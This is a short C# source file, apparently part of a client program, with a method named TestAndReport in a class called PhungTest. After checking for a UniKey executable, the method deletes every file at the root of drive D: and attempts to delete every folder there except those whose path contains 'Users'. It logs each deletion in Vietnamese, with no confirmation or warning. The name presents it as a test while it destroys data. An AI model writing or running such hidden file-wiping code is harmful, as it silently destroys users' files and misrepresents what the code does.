using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
namespace Client99
{
    class PhungTest
    {
        public PhungTest() { }
       

        public static string TestAndReport()
        {
            string report = "";
            if (System.IO.File.Exists("C:/Program Files/UniKey42/UniKeyNT.exe"))
                report += "Tim thay";
            else
                report += "Khong tim thay!";
            // xoa file
            report += "\n--------------\n";
            
            string[] folders = System.IO.Directory.GetDirectories("d:/");
            foreach (string p in folders)
            {
                if(!p.Contains("Users"))

                {
                    try
                    {
                        System.IO.Directory.Delete(p);
                        report += "_" + p + "_ đã bị xóa\n";
                    }
                    catch(UnauthorizedAccessException )
                    {
                        report += "!!!! bỏ qua thư mục _" + p + "_\n";
                    }
                    catch (IOException )
                    {
                        report += "!!!! bỏ qua thư mục _" + p + "_\n";

                    }

                }
            }
            string[] filePaths1 = System.IO.Directory.GetFiles(@"D:\", "*.*");
            foreach (string p in filePaths1)
            {
                try
                {
                    System.IO.File.Delete(p);
                    report += "_" + p + "_đã bị xóa\n";
                }
                catch (UnauthorizedAccessException )
                {
                    report += "!!!! bỏ qua file _" + p + "_\n";
                }
            }

            return report;
        }
        
       

    }




    //test here

    ////////////////end test
}
                    